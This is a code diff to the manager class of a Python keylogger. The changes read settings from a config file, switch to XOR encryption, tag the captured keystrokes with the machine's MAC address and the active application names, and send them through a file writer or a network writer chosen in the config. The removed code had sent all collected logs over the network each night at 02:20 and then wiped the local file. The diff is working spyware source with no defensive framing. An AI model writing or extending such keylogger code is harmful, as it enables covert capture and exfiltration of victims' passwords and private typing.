@@ -1,6 +1,7 @@
+import json
 import sys
 sys.path.append('../../utilities/encryptionDecryption')
-from encryption import Encryption
+from xorEncryptor import XorEncryptor
 import uuid
 from logger.keylogger.keylogger_service import KeyloggerService
 from logger.writer.FileWriter import FileWriter
@@ -31,10 +32,12 @@ class KeyLoggerManager:
     """
 
     def __init__(self):
+        with open('../config.json', 'r') as f:
+            self.config = json.load(f)
         self.mac_address = hex(uuid.getnode())
-        self.writer = FileWriter()
+        self.writer = FileWriter() if self.config['writer'] == 'file_writer' else NetWorkWriter()
         self.keylogger = KeyloggerService()
-        self.encoder = Encryption(open('../../utilities/key.txt', 'r').read())
+        self.encoder = XorEncryptor(open('../../utilities/key.txt', 'r').read())
         self.flag = True
 
     def start(self):
@@ -61,42 +64,19 @@ class KeyLoggerManager:
         Runs in a loop until `self.flag` is set to False.
         """
         while self.flag:
-            logged_keys = "".join(self.keylogger.get_logged_keys())
+            apps, logged_keys = self.keylogger.get_logged_keys()
             if logged_keys:
-                logged_keys = datetime.now().strftime('%H:%M:%S %d/%m/%Y\n') + logged_keys
+                final_data = (self.mac_address + '\n' + datetime.now().strftime('%H:%M:%S %d/%m/%Y\n')
+                              + ", ".join(apps) + '\n' + logged_keys)
                 try:
-                    encrypted_data = self.encoder.encryption(logged_keys)
-                    self.write_data(encrypted_data)
+                    encrypted_data = self.encoder.encrypt(final_data)
+                    self.writer.send_data(encrypted_data)
+                    logging.info(f'Data written to {self.writer}')
                 except Exception as e:
                     logging.error(e)
                     return
-            else:
-                self.write_data('')
-            sleep(5)
+            sleep(self.config['sleep_seconds'])
         self.keylogger.stop_logging()
         self.flag = False
         logging.info('Logging stopped')
-
-    def write_data(self, encrypted_data):
-        """
-        Writes encrypted log data to a file or sends it over the network.
-
-        At 02:20:00 - 02:20:05, it switches to `NetWorkWriter`, reads stored data,
-        and sends all collected logs before clearing the local file.
-
-        Parameters:
-        -----------
-        encrypted_data : str
-            The encrypted log data to be written or sent.
-        """
-        if datetime.now().hour == 2 and datetime.now().minute == 20 and 0 <= datetime.now().second <= 5:
-            self.writer = NetWorkWriter()
-            with open('../Data_File.txt', 'r') as file:
-                encrypted_data = file.read() + encrypted_data
-            with open('../Data_File.txt', 'w') as file:
-                pass
-        else:
-            self.writer = FileWriter()
-        self.writer.send_data(encrypted_data, self.mac_address)
-        logging.info(f'Data written to {self.writer}')
 
